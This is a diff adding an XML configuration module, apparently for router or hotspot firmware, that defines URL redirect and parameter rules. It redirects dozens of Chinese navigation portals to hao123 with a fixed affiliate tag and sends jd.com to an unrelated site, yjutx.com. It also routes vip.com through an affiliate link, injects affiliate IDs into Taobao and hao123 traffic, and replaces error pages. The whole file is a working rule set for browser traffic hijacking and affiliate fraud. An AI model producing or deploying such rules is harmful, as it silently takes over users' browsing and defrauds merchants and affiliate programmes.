@@ -1,0 +1,132 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<bhu_module>
+    <http404>
+       <ITEM sequence="1" ver="style000-00.00.01" enable="enable" codes="40*,502" url="http://7xo2t3.com2.z0.glb.qiniucdn.com/404/style001/index.html" />
+    </http404>
+    <redirect>
+       <ITEM ver="style000-00.00.01" enable="enable" >
+           <list>
+              <SUB sequence="1" src_url="http://hao.360.cn/" dest_url="http://www.hao123.com/?tn=92919023_s_hao_pg" interval="3600" />
+              <SUB sequence="2" src_url="http://www.2345.com/" dest_url="http://www.hao123.com/?tn=92919023_s_hao_pg" interval="3600" />
+              <SUB sequence="3" src_url="http://123.sogou.com/" dest_url="http://www.hao123.com/?tn=92919023_s_hao_pg" interval="3600" />
+              <SUB sequence="4" src_url="http://www.3456.cc/" dest_url="http://www.hao123.com/?tn=92919023_s_hao_pg" interval="3600" />
+              <SUB sequence="5" src_url="http://hao.qq.com/" dest_url="http://www.hao123.com/?tn=92919023_s_hao_pg" interval="3600" />
+              <SUB sequence="6" src_url="http://www.duba.com/" dest_url="http://www.hao123.com/?tn=92919023_s_hao_pg" interval="3600" />
+              <SUB sequence="7" src_url="http://www.2345.in/" dest_url="http://www.hao123.com/?tn=92919023_s_hao_pg" interval="3600" />
+              <SUB sequence="8" src_url="http://www.265.com/" dest_url="http://www.hao123.com/?tn=92919023_s_hao_pg" interval="3600" />
+              <SUB sequence="9" src_url="http://www.114la.com/" dest_url="http://www.hao123.com/?tn=92919023_s_hao_pg" interval="3600" />
+              <SUB sequence="10" src_url="http://www.site.baidu.com/" dest_url="http://www.hao123.com/?tn=92919023_s_hao_pg" interval="3600" />
+              <SUB sequence="11" src_url="http://www.tao123.com/" dest_url="http://www.hao123.com/?tn=92919023_s_hao_pg" interval="3600" />
+              <SUB sequence="12" src_url="http://www.1616.net/" dest_url="http://www.hao123.com/?tn=92919023_s_hao_pg" interval="3600" />
+              <SUB sequence="13" src_url="http://www.9991.com/" dest_url="http://www.hao123.com/?tn=92919023_s_hao_pg" interval="3600" />
+              <SUB sequence="14" src_url="http://www.5566.net/" dest_url="http://www.hao123.com/?tn=92919023_s_hao_pg" interval="3600" />
+              <SUB sequence="15" src_url="http://www.0460.com/" dest_url="http://www.hao123.com/?tn=92919023_s_hao_pg" interval="3600" />
+              <SUB sequence="16" src_url="http://www.155.com/" dest_url="http://www.hao123.com/?tn=92919023_s_hao_pg" interval="3600" />
+              <SUB sequence="17" src_url="http://www.lvse.com/" dest_url="http://www.hao123.com/?tn=92919023_s_hao_pg" interval="3600" />
+              <SUB sequence="18" src_url="http://www.world68.com/" dest_url="http://www.hao123.com/?tn=92919023_s_hao_pg" interval="3600" />
+              <SUB sequence="19" src_url="http://cn.16lao.com/" dest_url="http://www.hao123.com/?tn=92919023_s_hao_pg" interval="3600" />
+              <SUB sequence="20" src_url="http://www.114top.com/" dest_url="http://www.hao123.com/?tn=92919023_s_hao_pg" interval="3600" />
+              <SUB sequence="21" src_url="http://www.558871.com/" dest_url="http://www.hao123.com/?tn=92919023_s_hao_pg" interval="3600" />
+              <SUB sequence="22" src_url="http://www.wzdq123.com/" dest_url="http://www.hao123.com/?tn=92919023_s_hao_pg" interval="3600" />
+              <SUB sequence="23" src_url="http://www.dn1234.com/" dest_url="http://www.hao123.com/?tn=92919023_s_hao_pg" interval="3600" />
+              <SUB sequence="24" src_url="http://www.3145.com/" dest_url="http://www.hao123.com/?tn=92919023_s_hao_pg" interval="3600" />
+              <SUB sequence="25" src_url="http://www.369.com/" dest_url="http://www.hao123.com/?tn=92919023_s_hao_pg" interval="3600" />
+              <SUB sequence="26" src_url="http://www.7999.com/" dest_url="http://www.hao123.com/?tn=92919023_s_hao_pg" interval="3600" />
+              <SUB sequence="27" src_url="http://www.hao0039.com/" dest_url="http://www.hao123.com/?tn=92919023_s_hao_pg" interval="3600" />
+              <SUB sequence="28" src_url="http://www.ss256.com/" dest_url="http://www.hao123.com/?tn=92919023_s_hao_pg" interval="3600" />
+              <SUB sequence="29" src_url="http://www.12345good.com/" dest_url="http://www.hao123.com/?tn=92919023_s_hao_pg" interval="3600" />
+              <SUB sequence="30" src_url="http://www.wang1314.com/site.htm" dest_url="http://www.hao123.com/?tn=92919023_s_hao_pg" interval="3600" />
+              <SUB sequence="31" src_url="http://www.02516.com/" dest_url="http://www.hao123.com/?tn=92919023_s_hao_pg" interval="3600" />
+              <SUB sequence="32" src_url="http://www.lggg.cn/" dest_url="http://www.hao123.com/?tn=92919023_s_hao_pg" interval="3600" />
+              <SUB sequence="33" src_url="http://www.37021.com/" dest_url="http://www.hao123.com/?tn=92919023_s_hao_pg" interval="3600" />
+              <SUB sequence="34" src_url="http://www.17909.com/" dest_url="http://www.hao123.com/?tn=92919023_s_hao_pg" interval="3600" />
+              <SUB sequence="35" src_url="http://www.16116.com/" dest_url="http://www.hao123.com/?tn=92919023_s_hao_pg" interval="3600" />
+              <SUB sequence="36" src_url="http://www.tongcheng118.com/" dest_url="http://www.hao123.com/?tn=92919023_s_hao_pg" interval="3600" />
+              <SUB sequence="37" src_url="http://www.57616.com/" dest_url="http://www.hao123.com/?tn=92919023_s_hao_pg" interval="3600" />
+              <SUB sequence="38" src_url="http://www.51585.com/" dest_url="http://www.hao123.com/?tn=92919023_s_hao_pg" interval="3600" />
+              <SUB sequence="39" src_url="http://www.6655.com/" dest_url="http://www.hao123.com/?tn=92919023_s_hao_pg" interval="3600" />
+              <SUB sequence="40" src_url="http://www.1234wu.com/" dest_url="http://www.hao123.com/?tn=92919023_s_hao_pg" interval="3600" />
+              <SUB sequence="41" src_url="http://www.6617.com/" dest_url="http://www.hao123.com/?tn=92919023_s_hao_pg" interval="3600" />
+              <SUB sequence="42" src_url="http://hao.rising.cn/" dest_url="http://www.hao123.com/?tn=92919023_s_hao_pg" interval="3600" />
+              <SUB sequence="43" src_url="http://www.wu123.com/" dest_url="http://www.hao123.com/?tn=92919023_s_hao_pg" interval="3600" />
+              <SUB sequence="44" src_url="http://www.265h.com/" dest_url="http://www.hao123.com/?tn=92919023_s_hao_pg" interval="3600" />
+              <SUB sequence="45" src_url="http://www.ok1616.com/" dest_url="http://www.hao123.com/?tn=92919023_s_hao_pg" interval="3600" />
+              <SUB sequence="46" src_url="http://www.wangzhanchi.com/" dest_url="http://www.hao123.com/?tn=92919023_s_hao_pg" interval="3600" />
+              <SUB sequence="47" src_url="http://www.726.com/" dest_url="http://www.hao123.com/?tn=92919023_s_hao_pg" interval="3600" />
+              <SUB sequence="48" src_url="http://www.qq123.cc" dest_url="http://www.hao123.com/?tn=92919023_s_hao_pg" interval="3600" />
+              <SUB sequence="49" src_url="http://www.haokan123.com" dest_url="http://www.hao123.com/?tn=92919023_s_hao_pg" interval="3600" />
+              <SUB sequence="50" src_url="http://www.ov98.com/" dest_url="http://www.hao123.com/?tn=92919023_s_hao_pg" interval="3600" />
+              <SUB sequence="51" src_url="http://www.1635.cn" dest_url="http://www.hao123.com/?tn=92919023_s_hao_pg" interval="3600" />
+              <SUB sequence="52" src_url="http://www.bai68.net/" dest_url="http://www.hao123.com/?tn=92919023_s_hao_pg" interval="3600" />
+              <SUB sequence="53" src_url="http://www.aspxz.net/" dest_url="http://www.hao123.com/?tn=92919023_s_hao_pg" interval="3600" />
+              <SUB sequence="54" src_url="http://www.hi567.com/?19907" dest_url="http://www.hao123.com/?tn=92919023_s_hao_pg" interval="3600" />
+              <SUB sequence="55" src_url="http://www.ie123.com/" dest_url="http://www.hao123.com/?tn=92919023_s_hao_pg" interval="3600" />
+              <SUB sequence="56" src_url="http://www.37125.com/" dest_url="http://www.hao123.com/?tn=92919023_s_hao_pg" interval="3600" />
+              <SUB sequence="57" src_url="http://www.cxgll.com/" dest_url="http://www.hao123.com/?tn=92919023_s_hao_pg" interval="3600" />
+              <SUB sequence="58" src_url="http://www.123do.com/" dest_url="http://www.hao123.com/?tn=92919023_s_hao_pg" interval="3600" />
+              <SUB sequence="59" src_url="http://www.babaw.com/" dest_url="http://www.hao123.com/?tn=92919023_s_hao_pg" interval="3600" />
+              <SUB sequence="60" src_url="http://www.qgds.com/" dest_url="http://www.hao123.com/?tn=92919023_s_hao_pg" interval="3600" />
+              <SUB sequence="61" src_url="http://www.0798.org/" dest_url="http://www.hao123.com/?tn=92919023_s_hao_pg" interval="3600" />
+              <SUB sequence="62" src_url="http://www.129e.com/" dest_url="http://www.hao123.com/?tn=92919023_s_hao_pg" interval="3600" />
+              <SUB sequence="63" src_url="http://www.totoj.com/" dest_url="http://www.hao123.com/?tn=92919023_s_hao_pg" interval="3600" />
+              <SUB sequence="64" src_url="http://www.5252t.com/" dest_url="http://www.hao123.com/?tn=92919023_s_hao_pg" interval="3600" />
+              <SUB sequence="65" src_url="http://www.sou300.cn/" dest_url="http://www.hao123.com/?tn=92919023_s_hao_pg" interval="3600" />
+              <SUB sequence="66" src_url="http://www.hao123.la/" dest_url="http://www.hao123.com/?tn=92919023_s_hao_pg" interval="3600" />
+              <SUB sequence="67" src_url="http://www.73738.com/" dest_url="http://www.hao123.com/?tn=92919023_s_hao_pg" interval="3600" />
+              <SUB sequence="68" src_url="http://www.wosou123.com/" dest_url="http://www.hao123.com/?tn=92919023_s_hao_pg" interval="3600" />
+              <SUB sequence="69" src_url="http://www.tm007.cn/" dest_url="http://www.hao123.com/?tn=92919023_s_hao_pg" interval="3600" />
+              <SUB sequence="70" src_url="http://www.116ya.com/" dest_url="http://www.hao123.com/?tn=92919023_s_hao_pg" interval="3600" />
+              <SUB sequence="71" src_url="http://www.52358.com/" dest_url="http://www.hao123.com/?tn=92919023_s_hao_pg" interval="3600" />
+              <SUB sequence="72" src_url="http://www.jimo123.com/" dest_url="http://www.hao123.com/?tn=92919023_s_hao_pg" interval="3600" />
+              <SUB sequence="73" src_url="http://www.hb123.net/" dest_url="http://www.hao123.com/?tn=92919023_s_hao_pg" interval="3600" />
+              <SUB sequence="74" src_url="http://www.pm51.com/" dest_url="http://www.hao123.com/?tn=92919023_s_hao_pg" interval="3600" />
+              <SUB sequence="75" src_url="http://www.yowao.com/" dest_url="http://www.hao123.com/?tn=92919023_s_hao_pg" interval="3600" />
+              <SUB sequence="76" src_url="http://www.99810.net/" dest_url="http://www.hao123.com/?tn=92919023_s_hao_pg" interval="3600" />
+              <SUB sequence="77" src_url="http://www.1516.net/" dest_url="http://www.hao123.com/?tn=92919023_s_hao_pg" interval="3600" />
+              <SUB sequence="78" src_url="http://www.33xin.com/" dest_url="http://www.hao123.com/?tn=92919023_s_hao_pg" interval="3600" />
+              <SUB sequence="79" src_url="http://www.kan588.com/" dest_url="http://www.hao123.com/?tn=92919023_s_hao_pg" interval="3600" />
+              <SUB sequence="80" src_url="http://www.tui6.com/" dest_url="http://www.hao123.com/?tn=92919023_s_hao_pg" interval="3600" />
+              <SUB sequence="81" src_url="http://www.it963.com/" dest_url="http://www.hao123.com/?tn=92919023_s_hao_pg" interval="3600" />
+              <SUB sequence="82" src_url="http://www.088099.com/" dest_url="http://www.hao123.com/?tn=92919023_s_hao_pg" interval="3600" />
+              <SUB sequence="83" src_url="http://www.5w.com/" dest_url="http://www.hao123.com/?tn=92919023_s_hao_pg" interval="3600" />
+              <SUB sequence="84" src_url="http://hei520.com/" dest_url="http://www.hao123.com/?tn=92919023_s_hao_pg" interval="3600" />
+              <SUB sequence="85" src_url="http://www.tianzihao.com/" dest_url="http://www.hao123.com/?tn=92919023_s_hao_pg" interval="3600" />
+              <SUB sequence="86" src_url="http://www.959.cc/" dest_url="http://www.hao123.com/?tn=92919023_s_hao_pg" interval="3600" />
+              <SUB sequence="87" src_url="http://www.373168.com/" dest_url="http://www.hao123.com/?tn=92919023_s_hao_pg" interval="3600" />
+              <SUB sequence="88" src_url="http://i.maxthon.cn/websites" dest_url="http://www.hao123.com/?tn=92919023_s_hao_pg" interval="3600" />
+              <SUB sequence="89" src_url="http://www.mianfeia.com/" dest_url="http://www.hao123.com/?tn=92919023_s_hao_pg" interval="3600" />
+              <SUB sequence="90" src_url="http://www.0519.com/" dest_url="http://www.hao123.com/?tn=92919023_s_hao_pg" interval="3600" />
+              <SUB sequence="91" src_url="http://www.9123.com/" dest_url="http://www.hao123.com/?tn=92919023_s_hao_pg" interval="3600" />
+              <SUB sequence="92" src_url="http://www.558871.com/" dest_url="http://www.hao123.com/?tn=92919023_s_hao_pg" interval="3600" />
+              <SUB sequence="93" src_url="http://h5.mse.360.cn/navi.html" dest_url="http://m.hao123.com/?union=1&amp;from=1012546c&amp;tn=ops1012546c" interval="3600" />
+              <SUB sequence="94" src_url="http://m.2345.com/" dest_url="http://m.hao123.com/?union=1&amp;from=1012546c&amp;tn=ops1012546c" interval="3600" />
+              <SUB sequence="95" src_url="http://dh.123.sougou.com/" dest_url="http://m.hao123.com/?union=1&amp;from=1012546c&amp;tn=ops1012546c" interval="3600" />
+              <SUB sequence="96" src_url="http://dh.123.sogou.com/" dest_url="http://m.hao123.com/?union=1&amp;from=1012546c&amp;tn=ops1012546c" interval="3600" />
+              <SUB sequence="97" src_url="http://hao.uc.cn/" dest_url="http://m.hao123.com/?union=1&amp;from=1012546c&amp;tn=ops1012546c" interval="3600" />
+              <SUB sequence="98" src_url="http://www.jd.com/" dest_url="http://www.yjutx.com/love.php" interval="300" />
+              <SUB sequence="99" src_url="http://m.jd.com/" dest_url="http://www.yjutx.com/love.php" interval="300" />
+              <SUB sequence="100" src_url="http://jd.com/" dest_url="http://www.yjutx.com/love.php" interval="300" />
+              <SUB sequence="101" src_url="http://www.vip.com/" dest_url="http://click.union.vip.com/redirect.php?url=eyJhZGNvZGUiOiJudGIwdjl0OCIsInNjaGVtZWNvZGUiOiJvb2JvZWxoaSIsInVjb2RlIjoidXd0c3B5ZWUifQ==" interval="300" />
+              <SUB sequence="102" src_url="http://vip.com/" dest_url="http://click.union.vip.com/redirect.php?url=eyJhZGNvZGUiOiJudGIwdjl0OCIsInNjaGVtZWNvZGUiOiJvb2JvZWxoaSIsInVjb2RlIjoidXd0c3B5ZWUifQ==" interval="300" />
+           </list>
+       </ITEM>
+    </redirect>
+    <brand>
+       <ITEM ver="style000-00.00.01" enable="enable" >
+           <list>
+             
+           </list>
+       </ITEM>
+    </brand>
+    <channel>
+       <ITEM ver="style000-00.00.01" enable="enable" >
+           <list>
+              <SUB sequence="1" src_url="www.hao123.com" param="tn=92919023_s_hao_pg" rate="100" />
+              <SUB sequence="2" src_url="m.hao123.com" param="union=1,from=1012546c,tn=ops1012546c" rate="100" />
+              <SUB sequence="3" src_url="http://temai.taobao.com" param="pid=mm_16118077_4038368_40870425" rate="100" />
+              <SUB sequence="4" src_url="http://ai.taobao.com" param="pid=mm_16118077_4038368_40880220" rate="100" />
+              <SUB sequence="5" src_url="http://click.union.vip.com/redirect.php" param="url=eyJhZGNvZGUiOiJudGIwdjl0OCIsInNjaGVtZWNvZGUiOiJvb2JvZWxoaSIsInVjb2RlIjoidXd0c3B5ZWUifQ==" rate="100" />
+           </list>
+       </ITEM>
+    </channel>
+</bhu_module>
